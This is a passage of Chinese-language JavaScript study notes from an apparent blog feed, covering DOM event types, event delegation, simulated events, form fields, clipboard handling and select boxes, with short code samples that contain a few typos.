在元素获得焦点时触发</li><li>blur: 在元素失去焦点时触发</li></ul><p><br></p><h4 id="5-3-鼠标与滚轮事件"><a href="#5-3-鼠标与滚轮事件" class="headerlink" title="5.3 鼠标与滚轮事件"></a>5.3 鼠标与滚轮事件</h4><table><thead><tr><th>鼠标事件</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td>click</td><td style="text-align:center">单击。只有在同一个元素上相继触发mousedown和mouseup事件，才会触发click事件</td></tr><tr><td>dbclick</td><td style="text-align:center">双击</td></tr><tr><td>mousedown</td><td style="text-align:center">用户按下任意鼠标按钮时触发</td></tr><tr><td>mouseup</td><td style="text-align:center">用户释放鼠标按钮时触发</td></tr><tr><td>mouseenter</td><td style="text-align:center">光标从元素外部首次移动到元素范围内触发</td></tr><tr><td>mouseleave</td><td style="text-align:center">在位于元素上方的光标移动到元素范围外触发</td></tr><tr><td>mousemove</td><td style="text-align:center">当光标在元素内部移动时重复触发</td></tr><tr><td>mouseover</td><td style="text-align:center">鼠标进入，同mouseover</td></tr><tr><td>mouseout</td><td style="text-align:center">鼠标移出, 同mouseout</td></tr></tbody></table><p>事件触发顺序: mousedown -&gt; mouseup -&gt; click</p><p><br></p><h4 id="5-4-键盘事件"><a href="#5-4-键盘事件" class="headerlink" title="5.4 键盘事件"></a>5.4 键盘事件</h4><table><thead><tr><th>键盘事件</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td>keydown</td><td style="text-align:center">当用户按下键盘上的任意键时触发，长按不放，会重复触发</td></tr><tr><td>keypress</td><td style="text-align:center">当用户按下键盘上的字符键时触发，长按不放，会重复触发</td></tr><tr><td>keyup</td><td style="text-align:center">当用户释放键盘上的键时触发</td></tr></tbody></table><p>用户按下一个字符键时候，会依次触发 keydown -&gt; keypress -&gt; keyup。</p><ul><li>event.keycCode 非字符键的键码<br>在发生keydown和keyup事件时，会有一个event.keyCode,与键盘上一个特定的键对应。</li></ul><ul><li>event.charCode 字符键的键码<br>只有在keypress的时候才触发，<code>event.charCode</code>是键的ascii码。</li></ul><ul><li><p>event.key, event.keyIdentifier, event.keyLocation<br>DOM3级事件的键盘事件，不再包含charCode属性，而包含了两个新属性: key和char。<br><code>event.key</code>对应的是相应的文本字符(如k,M)。<br><code>event.keyIdentifier</code>返回一个类似”U+0000”的字符串，表示Unicode值。(chrome和safari支持)<br><code>event.location || event.keyLocation</code>表示按下了什么位置上的键: 0-默认键盘，1-左侧位置, 2-右侧位置, 3-数字小键盘, 4-移动设备键盘(虚拟键盘), 5-手柄。(IE9,safari,chrome支持)</p></li><li><p>textInput事件<br>DOM3引入了一个新事件，只有可编辑区域才能触发textInput事件。它的<code>event.data</code>属性，就是用户输入的字符。<code>event.inputMethod</code>，表示文本输入到文本框中的方式。</p></li></ul><p><br></p><h4 id="5-5-html5事件"><a href="#5-5-html5事件" class="headerlink" title="5.5 html5事件"></a>5.5 html5事件</h4><h5 id="5-5-1-contextmenu"><a href="#5-5-1-contextmenu" class="headerlink" title="5.5.1 contextmenu"></a>5.5.1 contextmenu</h5><p>设置鼠标右击菜单<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHandler(<span class="built_in">window</span>, <span class="string">'load'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">'myDiv'</span>);</span><br><span class="line"></span><br><span class="line">  EventUtil.addHandler(div, <span class="string">'contextmenu'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    event = EventUtil.getEvent(event);</span><br><span class="line">    EventUtil.preventDefault(event);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> menu = <span class="built_in">document</span>.getElementById(<span class="string">'myMenu'</span>);</span><br><span class="line">    menu.style.left = event.clientX + <span class="string">'px'</span>;</span><br><span class="line">    menu.style.top = event.clientY + <span class="string">'px'</span>;</span><br><span class="line">    menu.style.visibility = <span class="string">'visible'</span>;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  EventUtil.addHandler(<span class="built_in">document</span>, <span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">'myMenu'</span>).style.visibility = <span class="string">'hidden'</span>;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h5 id="5-5-2-beforeunload"><a href="#5-5-2-beforeunload" class="headerlink" title="5.5.2 beforeunload"></a>5.5.2 beforeunload</h5><p>IE, firefox, safari, chrome都支持<code>beforeunload</code>事件，在浏览器卸载页面之前询问用户是否真的要关闭页面。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHandler(<span class="built_in">window</span>, <span class="string">'beforeunload'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  event = EventUtil.getEvent(event);</span><br><span class="line">  event.returnValue = <span class="string">"i'm really going to miss you if you go."</span>;</span><br><span class="line">  <span class="keyword">return</span> message;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h5 id="5-5-3-DOMContentLoaded"><a href="#5-5-3-DOMContentLoaded" class="headerlink" title="5.5.3 DOMContentLoaded"></a>5.5.3 DOMContentLoaded</h5><p>window的load事件会在页面中的一切都加载完毕时触发，DOMContentLoaded事件则会在形成完整的DOM树之后触发。不理会图像，js,css或其他资源是否已经下载完毕。</p><p><br></p><h5 id="5-5-4-pageshow-pagehide"><a href="#5-5-4-pageshow-pagehide" class="headerlink" title="5.5.4 pageshow, pagehide"></a>5.5.4 pageshow, pagehide</h5><p><code>window.pageshow</code>页面显示时触发。 <code>window.pagehide</code>在浏览器卸载页面时触发，在unload事情前触发。</p><p><br></p><h5 id="5-5-5-hashchange"><a href="#5-5-5-hashchange" class="headerlink" title="5.5.5 hashchange"></a>5.5.5 hashchange</h5><p>在ajax应用中，开发人员经常要利用url参数来保存状态或导航信息。url中#号后面的字符串发生变化时, hashchange事件就会被触发。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHandler(<span class="built_in">window</span>, <span class="string">'hashchange'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'current hash:'</span> + location.hash);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-6-设备事件"><a href="#5-6-设备事件" class="headerlink" title="5.6 设备事件"></a>5.6 设备事件</h4><h5 id="5-6-1-orientationchange"><a href="#5-6-1-orientationchange" class="headerlink" title="5.6. 1 orientationchange"></a>5.6. 1 orientationchange</h5><p>苹果safari添加了orientationchange时间，确定用户何时将设备由横向查看模式切换为纵向查看模式。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHanlder(<span class="built_in">window</span>, <span class="string">'load'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// 0 肖像模式，90 左旋转的横向模式， -90 右旋转的横向模式</span></span><br><span class="line">  div.innerHTML = <span class="string">'Current orientation is'</span> + <span class="built_in">window</span>.orientation;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h5 id="5-6-2-deviceorientation"><a href="#5-6-2-deviceorientation" class="headerlink" title="5.6.2 deviceorientation"></a>5.6.2 deviceorientation</h5><p>表示设备在空间中朝向哪里。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHandler(<span class="built_in">window</span>, <span class="string">'deviceorientation'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// alpha, beta, gamma分别指示围绕z,x,y轴旋转时y轴，z轴，z轴的度数差</span></span><br><span class="line">  <span class="built_in">console</span>.log(event.alpha + event.beta + event.gamma);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h5 id="5-6-3-devicemotion"><a href="#5-6-3-devicemotion" class="headerlink" title="5.6.3 devicemotion"></a>5.6.3 devicemotion</h5><p>表示设备什么时候移动。事件对象包含以下属性: acceleration每个方向上的加速度; accelerationIncludingGravity在考虑z轴自然重力加速度的情况下，告诉你在每个方向上的加速度。rotationRate方向值。</p><p><br></p><h4 id="5-7-触摸与手势事件"><a href="#5-7-触摸与手势事件" class="headerlink" title="5.7 触摸与手势事件"></a>5.7 触摸与手势事件</h4><p>touchstart    : 当手指触摸屏幕时触发<br>touchmove     : 当手指在屏幕上滑动时连续第触发<br>touchend      : 当手指在屏幕上移开时触发<br>touchcancel   : 当系统停止跟踪触摸时触发</p><p>只有两个手指都触摸，才会触发这些事件<br>gesturestart  : 当一个手指已经按在屏幕上而另一个手指又触摸屏幕时触发<br>gesturechange : 当触摸屏幕的任何一个手指的位置发生变化时触发<br>gestureend    : 当任何一个手指从屏幕上面移开时触发</p><p><br></p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul><li><p><em>unload</em><br><code>window.onunload</code> 在文档被完全卸载后触发。只要用户从一个页面切换到另一个页面，就会发生unload事件。这个事件最多的情况是清除引用，以避免内存泄露。</p></li><li><p><em>resize</em><br><code>window.onresize</code> 浏览器窗口被调整到一个新的高度或宽度时触发</p></li><li><p><em>scroll</em><br><code>window.scroll</code> 在文档被滚动期间重复触发</p></li><li><p><em>DOM变动事件</em><br><code>DOMNodeRemoved</code>会在使用removeChild()或replaceChild()删除结点时触发，event.target是被删除的节点，event.relatedNode包含着目标节点父节点的引用。<br><code>DOMNodeInserted</code>会在appendChild(), replaceChild(), insertBefore()插入节点时触发。</p></li></ul><p><br></p><h3 id="6-内存与性能"><a href="#6-内存与性能" class="headerlink" title="6. 内存与性能"></a>6. 内存与性能</h3><h4 id="6-1-事件委托"><a href="#6-1-事件委托" class="headerlink" title="6.1 事件委托"></a>6.1 事件委托</h4><p>对“事件处理程序过多”问题的解决方案就是<em>事件委托</em>。事件委托利用了事件冒泡，为整个页面指定一个onclick事件处理程序，而不必为每个可单击的元素分别添加事件处理程序。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHandler(list, <span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> event = EventUtil.getEvent(event);</span><br><span class="line">  <span class="keyword">var</span> target = EventUtil.getTarget(event);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span>(target.id)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'doSomething'</span>:</span><br><span class="line">      doSomething();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>document对象很快就可以访问，可以在页面生命周期的任何时点上为它添加事件处理程序（无需等待DOMContentLoaded或load事件）。只要可单击的元素呈现在页面上，就可以立即具备适当的工鞥。只添加一个事件处理程序所需的DOM引用更少，占用的内存空间更少，所花的时间也更少。<br><br></p><h4 id="6-2-模拟事件"><a href="#6-2-模拟事件" class="headerlink" title="6.2 模拟事件"></a>6.2 模拟事件</h4><p><code>createEvent</code>可以创建事件，通过<code>dispatchEvent</code>触发事件。<br>UIEvent 鼠标事件和键盘事件, MouseEvents 鼠标事件, MutationEvents DOM变动事件,HTMLEvents HTML事件。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 触发按钮点击事件</span></span><br><span class="line"><span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">"myBtn"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建事件对象</span></span><br><span class="line"><span class="keyword">var</span> event = <span class="built_in">document</span>.createEvent(<span class="string">"MouseEvents"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化事件对象</span></span><br><span class="line">event.initMouseEvent(<span class="string">"click"</span>, <span class="literal">true</span>, <span class="literal">true</span>, <span class="built_in">document</span>.defaultView, <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="literal">false</span>,<span class="literal">false</span>,<span class="literal">false</span>,<span class="literal">false</span>,<span class="number">0</span>,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 触发事件</span></span><br><span class="line">btn.dispatchEvent(event);</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li>《Javascript高级程序设计》第13章 事件</li></ul>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>表单组件，formData，file对象</title>
      <link href="/2019/03/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2019/03/28/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      <content type="html"><![CDATA[<h3 id="1-表单组件"><a href="#1-表单组件" class="headerlink" title="1. 表单组件"></a>1. 表单组件</h3><p><code>&lt;form&gt;</code>对应的是HTMLForm-Element类型，有它独有的属性和方法:</p><ul><li>acceptCharset: 服务器能处理的字符集</li><li>action: 接受请求的URL</li><li>elements: 表单中所有控件的集合(HTMLCollectino)</li><li>enctype: 请求的编码类型</li><li>length: 表单中控件的数量</li><li>method: 要发送的HTTP请求类型，get/post</li><li>name: 表单的名称</li><li>reset(): 将所有表单域重置为默认值</li><li>submit(): 提交表单</li><li>target: 用于发送请求和接收响应的窗口名称</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"/api"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">size</span>=<span class="string">"25"</span> <span class="attr">maxlength</span>=<span class="string">"50"</span> <span class="attr">value</span>=<span class="string">"initial value"</span> <span class="attr">autofocus</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">rows</span>=<span class="string">"25"</span> <span class="attr">cols</span>=<span class="string">"5"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"color"</span> <span class="attr">value</span>=<span class="string">"red"</span> <span class="attr">readOnly</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">"location"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"China"</span>&gt;</span>China<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span>Submit Form<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"reset"</span>&gt;</span>Reset Form<span class="tag">&lt;/<span class="name">button</span>&gt;</span> </span><br><span class="line">  </span><br><span class="line">  <span class="comment">&lt;!-- HTML5约束验证API --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text/email/url"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"number"</span> <span class="attr">min</span>=<span class="string">"0"</span> <span class="attr">max</span>=<span class="string">"100"</span> <span class="attr">step</span>=<span class="string">"5"</span> <span class="attr">name</span>=<span class="string">"count"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">  input.stepUp(1);</span></span><br><span class="line"><span class="comment">  input.stepDown(1);</span></span><br><span class="line"><span class="comment">  --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 点击submit button时候，会自动调用submit方法</span></span><br><span class="line"><span class="keyword">var</span> form = <span class="built_in">document</span>.getElementById(<span class="string">"myForm"</span>);</span><br><span class="line">EventUtil.addHandler(form, <span class="string">"submit"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// 阻止表单提交，先行验证表单数据</span></span><br><span class="line">  event = EventUtil.getEvent(event);</span><br><span class="line">  EventUtil.preventDefault(event);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 表单字段的共有属性</span></span><br><span class="line">  <span class="keyword">var</span> field = form.elements[<span class="number">0</span>];</span><br><span class="line">  field.value = <span class="string">"Another value"</span>;  <span class="comment">// 设置字段将被提交到服务器的值</span></span><br><span class="line">  field.disabled = <span class="literal">true</span>;          <span class="comment">// 禁用当前字段</span></span><br><span class="line">  field.type;                     <span class="comment">// 字段的类型，如checkbox, radio</span></span><br><span class="line">  field.readOnly                  <span class="comment">// 当前字段是否只读</span></span><br><span class="line">  field.focus();                  <span class="comment">// 把焦点设置到当前字段，实现自动切换焦点</span></span><br><span class="line">  field.blur();                   <span class="comment">// 失去焦点</span></span><br><span class="line">  field.select();                 <span class="comment">// 选中input, textarea的内容</span></span><br><span class="line">  form.submit();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 点击reset button时候，会自动调用reset方法</span></span><br><span class="line">EventUtil.addHandler(form, <span class="string">"reset"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  event = EventUtil.getEvent(event);</span><br><span class="line">  EventUtil.preventDefault(event);</span><br><span class="line"></span><br><span class="line">  form.reset();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><br></p><h3 id="2-文本框脚本"><a href="#2-文本框脚本" class="headerlink" title="2. 文本框脚本"></a>2. 文本框脚本</h3><h4 id="2-1-change事件"><a href="#2-1-change事件" class="headerlink" title="2.1 change事件"></a>2.1 change事件</h4><p>对于<code>&lt;input&gt;</code>和<code>&lt;textarea&gt;</code>，当它们获得焦点到失去焦点且value值改变时，才会触发change事件。对于<code>&lt;select&gt;</code>，只要用户选择了不同的选项，就会触发change事件。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> textbox = <span class="built_in">document</span>.forms[<span class="number">0</span>].elements[<span class="number">0</span>];</span><br><span class="line">EventUtil.addHandler(textbox, <span class="string">"change"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(event.target.value)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-2-select事件"><a href="#2-2-select事件" class="headerlink" title="2.2 select事件"></a>2.2 select事件</h4><p>使用<code>select()</code>可以选中文本。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> textbox = <span class="built_in">document</span>.forms[<span class="number">0</span>].elements[<span class="number">0</span>];</span><br><span class="line">textbox.select();</span><br><span class="line">textbox.setSelectionRange(<span class="number">0</span>, textbox.value.length);  <span class="comment">// "hello world"</span></span><br><span class="line">textbox.setSeelctionRange(<span class="number">0</span>, <span class="number">3</span>);                     <span class="comment">// "hel"</span></span><br></pre></td></tr></table></figure></p><p>同时当你在页面中选择文本时，会触发select事件。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHandler(textbox, <span class="string">"select"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'text selected'</span> + textbox.value.substring(textbox.selectionStart, textbox.selectionEnd));</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><p><br></p><h4 id="2-3-剪贴板事件"><a href="#2-3-剪贴板事件" class="headerlink" title="2.3 剪贴板事件"></a>2.3 剪贴板事件</h4><table><thead><tr><th>剪贴板事件</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>beforecopy</td><td style="text-align:center">复制前触发</td></tr><tr><td>copy</td><td style="text-align:center">复制时触发</td></tr><tr><td>beforecut</td><td style="text-align:center">剪切前触发</td></tr><tr><td>cut</td><td style="text-align:center">剪切时触发</td></tr><tr><td>beforepaste</td><td style="text-align:center">粘贴前触发</td></tr><tr><td>paste</td><td style="text-align:center">粘贴时触发</td></tr></tbody></table><p>要访问剪贴板中的数据，可以使用<code>clipboardData</code>对象，这个对象有三个方法: getData(), setData(), clearData()<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> EventUtil = &#123;</span><br><span class="line">  <span class="comment">// 获取剪贴板的文字</span></span><br><span class="line">  getClipboardText: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> clipboardData = (event.clipboardData || <span class="built_in">window</span>.clipboardData);</span><br><span class="line">    <span class="keyword">return</span> clipboardData.getData(<span class="string">"text"</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 设置剪贴板的文字</span></span><br><span class="line">  setClipboardText: <span class="function"><span class="keyword">function</span>(<span class="params">event, value</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (event.clipboardData)&#123;</span><br><span class="line">      retrun event.clipboardData.setData(<span class="string">"text/plain"</span>, value);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">window</span>.clipboardData)&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">window</span>.clipboardData.setData(<span class="string">"text"</span>, value);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置粘贴的内容</span></span><br><span class="line">EventUtil.addHanler(textbox, <span class="string">"paste"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  event = EventUtil.getEvent(event);</span><br><span class="line">  <span class="keyword">var</span> text = EventUtil.getClipboardText(event);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 确保只有数值才会被粘贴到文本框中</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="regexp">/^\d*$/</span>.test(text))&#123;</span><br><span class="line">    event.preventDefault();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-4-keypress事件过滤输入"><a href="#2-4-keypress事件过滤输入" class="headerlink" title="2.4 keypress事件过滤输入"></a>2.4 keypress事件过滤输入</h4><p>响应文本框的keypress事件，阻止这个事件的默认行为来屏蔽此类字符。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">EventUtil.addHandler(textbox, <span class="string">"keypress"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> charCode = EventUtil.getCharCode(event);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="regexp">/\d/</span>.test(<span class="built_in">String</span>.fromCharCode(charCode)))&#123;</span><br><span class="line">    event.preventDefault();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-选择框脚本"><a href="#3-选择框脚本" class="headerlink" title="3. 选择框脚本"></a>3. 选择框脚本</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- multiple 是否多选 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">"location"</span> <span class="attr">multiple</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"1"</span>&gt;</span>China<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>options</code>包含了所有选项。每个<code>options[i]</code>都有index, label, selected, text, value属性。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> selectbox = <span class="built_in">document</span>.forms[<span class="number">0</span>].elements[<span class="string">'location'</span>];</span><br><span class="line">selectbox.options[<span class="number">0</span>].text;    <span class="comment">// 选线的文本</span></span><br><span class="line">selectbox.options[<span class="number">0</span>].value;   <span class="comment">// 选项的值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 选中的选项 selectedIndex</span></span><br><span class="line"><span class="keyword">var</span> selectedIndex = selectbox.selectedIndex;</span><br><span class="line"><span class="keyword">var</span> selectedOption = selectbox.options[selectedIndex];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 新增选项</span></span><br><span class="line"><span class="keyword">var</span> newOption = <span class="keyword">new</span> Option(<span class="string">"Option text"</span>, <span class="string">"Option value"</span>);</span><br><span class="line">selectbox.add(newOption, <span class="literal">undefined</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除选项</span></span><br><span class="line">seletbox.remove(<span class="number">0</span>)  <span class="comment">// 移除第一个选项</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-表单序列化与formData"><a href="#4-表单序列化与formData" class="headerlink" title="4. 